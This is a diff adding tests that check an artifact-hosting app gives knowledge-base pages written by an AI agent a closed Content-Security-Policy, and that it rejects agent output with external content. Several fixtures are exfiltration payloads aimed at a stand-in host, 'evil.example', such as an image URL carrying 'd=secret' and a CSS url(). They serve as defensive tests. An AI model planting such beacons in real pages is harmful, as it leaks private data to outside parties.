@@ -36,9 +36,15 @@ vi.mock('./agent-refresh-runner', async (importOriginal) => {
 });
 
 const policy = vi.hoisted(() => ({ retentionDays: 0, trashDays: 30 }));
+// The artifact host, switchable per test (subdomain mode when set).
+const hosting = vi.hoisted(() => ({ host: '' }));
 vi.mock('@/core/artifacts/settings', async (importOriginal) => {
   const actual = await importOriginal<typeof import('@/core/artifacts/settings')>();
-  return { ...actual, resolveArtifactRetention: () => ({ ...policy }) };
+  return {
+    ...actual,
+    resolveArtifactRetention: () => ({ ...policy }),
+    resolveArtifactSettings: () => ({ ...actual.resolveArtifactSettings(), host: hosting.host, proto: 'https' as const }),
+  };
 });
 
 // The real runner's worker, scripted (last suite).
@@ -664,6 +670,98 @@ describe('the instruction and its tools', () => {
     expect(await put.json()).toMatchObject({ code: 'refresh_unavailable' });
     const { artifactRefreshRepository } = await import('@/db/repositories/artifact-refresh-repository');
     expect(await artifactRefreshRepository.get(spaceArtifact.id)).toBeNull();
+  });
+});
+
+describe('a knowledge-base page reaches no network', () => {
+  const ARTIFACT_HOST = 'artifacts.test';
+  /** The embed's CSP header and the <meta> copy, in path mode and on the artifact host. */
+  async function embedPolicies(slug: string): Promise<string[]> {
+    const out: string[] = [];
+    const path = await app.handle(new Request(`http://localhost/__artifacts__/a/${slug}/embed`, { headers: { authorization: `Bearer ${tokens[alice]}` } }));
+    expect(path.status).toBe(200);
+    out.push(path.headers.get('content-security-policy')!, /<meta http-equiv="Content-Security-Policy" content="([^"]*)"/.exec(await path.text())![1].replace(/&#39;/g, '\'').replace(/&quot;/g, '"'));
+    hosting.host = ARTIFACT_HOST;
+    try {
+      const sub = await app.handle(new Request(`http://localhost/a/${slug}/embed`, { headers: { host: ARTIFACT_HOST } }));
+      expect(sub.status).toBe(200);
+      out.push(sub.headers.get('content-security-policy')!, /<meta http-equiv="Content-Security-Policy" content="([^"]*)"/.exec(await sub.text())![1].replace(/&#39;/g, '\'').replace(/&quot;/g, '"'));
+    } finally {
+      hosting.host = '';
+    }
+    return out;
+  }
+  const strict = (csp: string) => {
+    expect(csp).not.toMatch(/https:|wss:|http:|\*/);
+    expect(csp).toContain('connect-src \'none\'');
+    expect(csp).toContain('img-src data: blob:');
+    expect(csp).toMatch(/default-src 'none'/);
+  };
+  const normal = (csp: string) => expect(csp).toContain('img-src \'self\' data: https:');
+
+  async function publicSeed(slug: string, knowledge: boolean) {
+    const a = await seed(slug);
+    expect((await call('PUT', `/api/artifacts/${a.id}`, { body: { visibility: 'public' } })).status).toBe(200);
+    if (knowledge) expect((await call('PUT', `/api/artifacts/${a.id}/agent-refresh`, { body: { knowledgeAccess: true } })).status).toBe(200);
+    return a;
+  }
+  async function refreshWith(id: string, reply: string) {
+    script.steps.push({ reply });
+    expect((await call('POST', `/api/artifacts/${id}/agent-refresh/run`)).status).toBe(202);
+    return settled(id);
+  }
+
+  test('its version gets the closed policy on every hosting path; turning knowledge off later does not loosen it', async () => {
+    const a = await publicSeed('kb-strict', true);
+    expect((await refreshWith(a.id, '```html\n<h1>From my notes</h1><img src="data:image/png;base64,AAAA">\n```')).lastOutcome).toBe('success');
+    const { artifactsRepository } = await import('@/db/repositories/artifacts-repository');
+    expect((await artifactsRepository.getVersion((await current(a.id)).versionId!))?.network).toBe('none');
+    const policies = await embedPolicies('kb-strict');
+    expect(policies).toHaveLength(4);
+    for (const csp of policies) strict(csp);
+    // No viewer token or SDK in a closed page.
+    const html = await (await app.handle(new Request('http://localhost/__artifacts__/a/kb-strict/embed', { headers: { authorization: `Bearer ${tokens[alice]}` } }))).text();
+    expect(html).not.toContain('octipus-artifact-token');
+    expect(html).not.toContain('octipus-artifact-client.js');
+
+    expect((await call('PUT', `/api/artifacts/${a.id}/agent-refresh`, { body: { knowledgeAccess: false } })).status).toBe(200);
+    for (const csp of await embedPolicies('kb-strict')) strict(csp);
+    // A restore of that version stays closed.
+    const kbVersion = (await current(a.id)).versionId!;
+    expect((await call('POST', `/api/artifacts/${a.id}/versions/${a.versionId}/restore`)).status).toBe(200);
+    for (const csp of await embedPolicies('kb-strict')) normal(csp);
+    expect((await call('POST', `/api/artifacts/${a.id}/versions/${kbVersion}/restore`)).status).toBe(200);
+    for (const csp of await embedPolicies('kb-strict')) strict(csp);
+    // A hand edit is the owner's page again: the normal policy.
+    expect((await call('PUT', `/api/artifacts/${a.id}`, { body: { htmlTemplate: '<p>by hand</p>' } })).status).toBe(200);
+    for (const csp of await embedPolicies('kb-strict')) normal(csp);
+  });
+
+  test('web-mode and hand-made versions keep the existing policy', async () => {
+    const a = await publicSeed('web-normal', false);
+    const before = await embedPolicies('web-normal');
+    for (const csp of before) normal(csp);
+    expect((await refreshWith(a.id, PAGE)).lastOutcome).toBe('success');
+    const { artifactsRepository } = await import('@/db/repositories/artifacts-repository');
+    expect((await artifactsRepository.getVersion((await current(a.id)).versionId!))?.network).toBe('default');
+    const after = await embedPolicies('web-normal');
+    for (const csp of after) normal(csp);
+    // Same policy apart from the bundle hash the refreshed page added.
+    const strip = (csp: string) => csp.replace(/'sha256-[^']+'/g, '').replace(/\s+/g, ' ');
+    expect(after.map(strip)).toEqual(before.map(strip));
+  });
+
+  test('a knowledge-base page with an external image or a script is refused, and the old version stays', async () => {
+    const a = await publicSeed('kb-refused', true);
+    const img = await refreshWith(a.id, '```html\n<h1>Notes</h1><img src="https://evil.example/p.gif?d=secret">\n```');
+    expect(img.lastOutcome).toBe('failed');
+    expect(img.lastError).toMatch(/self-contained page.*src="https:\/\/evil\.example\/p\.gif\?d=secret"/);
+    const css = await refreshWith(a.id, '```html\n<h1>Notes</h1>\n```\n```css\nbody { background: url(//evil.example/b.png); }\n```');
+    expect(css.lastError).toMatch(/url\(\/\/evil\.example\/b\.png\)/);
+    const js = await refreshWith(a.id, '```html\n<h1>Notes</h1><script>location = "/x";</script>\n```');
+    expect(js.lastError).toMatch(/without JavaScript/);
+    expect(await current(a.id)).toEqual({ versionId: a.versionId, versions: 1 });
+    for (const csp of await embedPolicies('kb-refused')) normal(csp);
   });
 });
 
